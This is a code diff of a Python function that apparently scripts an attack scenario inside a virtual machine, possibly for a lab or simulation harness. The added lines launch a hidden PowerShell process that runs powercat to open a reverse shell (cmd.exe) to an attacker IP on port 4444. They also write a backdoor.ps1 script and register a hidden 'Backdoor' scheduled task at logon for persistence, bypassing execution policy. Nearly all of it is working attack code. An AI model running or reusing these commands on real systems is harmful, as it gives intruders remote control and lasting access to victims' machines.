@@ -88,19 +88,45 @@ def backdoor_scenario(domain: GraphicalVirshDomain, config: dict):
 
     # Step 3: Execute the Reverse Shell Immediately
     attacker_ip = config["backdoor"]["attacker_ip"]
-    reverse_shell_command = rf"powercat -c {attacker_ip} -p 4444 -e cmd.exe"
+    reverse_shell_command = rf'Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -Command `"`. C:\ProgramData\powercat.ps1; powercat -c {attacker_ip} -p 4444 -e cmd.exe`""'
     ps.send_command(reverse_shell_command, get_output=False)
+    sleep(2)
 
-    # Step 4: Create a Scheduled Task for Persistence on Logon
+
+    # Step 4: Create a PowerShell script (backdoor.ps1) as preparation for the Scheduled Task for Persistence on Logon
+    # Define attacker IP
+    ps.send_command(rf'$attacker_ip = "{attacker_ip}"', get_output=False)
+
+    # Define the first script line
+    ps.send_command(rf'$script_line1 = ". C:\ProgramData\powercat.ps1"', get_output=False)
+
+    # Define the second script line
+    ps.send_command(rf'$script_line2 = "powercat -c $attacker_ip -p 4444 -e cmd.exe"', get_output=False)
+
+    # Define the script path
+    ps.send_command(rf'$script_path = "C:\ProgramData\backdoor.ps1"', get_output=False)
+
+    # Concatenate the script lines into script content
+    ps.send_command(rf'$script_content = $script_line1 + "`n" + $script_line2', get_output=False)
+
+    # Write the script content to a file
+    ps.send_command(rf'$script_content | Out-File -FilePath $script_path -Encoding UTF8', get_output=False)
+    sleep(2)
+
+    # Step 5: Create the scheduled task to run the backdoor.ps1 script at logon
     '''
     schtasks /create → Creates a new Windows Scheduled Task
     /tn Backdoor → Names the task "Backdoor"
-    /tr "powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\powercat.ps1 ..." → Runs Powercat
+    /tr "powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\backdoor.ps1 ..." → Runs the script
     /sc onlogon → Runs at user login (for persistence)
     /f → Forces task creation, overwriting any existing task with the same name
     '''
-    ps.send_command(rf'schtasks /create /tn "Backdoor" /tr "{reverse_shell_command}" /sc onlogon /f', get_output=False)
+    create_scheduled_task_command = rf'''
+    schtasks.exe /create /tn "Backdoor" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\backdoor.ps1" /sc onlogon /f
+    '''
+    ps.send_command(create_scheduled_task_command, get_output=False)
     sleep(2)
+
 
     # Close the PowerShell application
     ps.close()
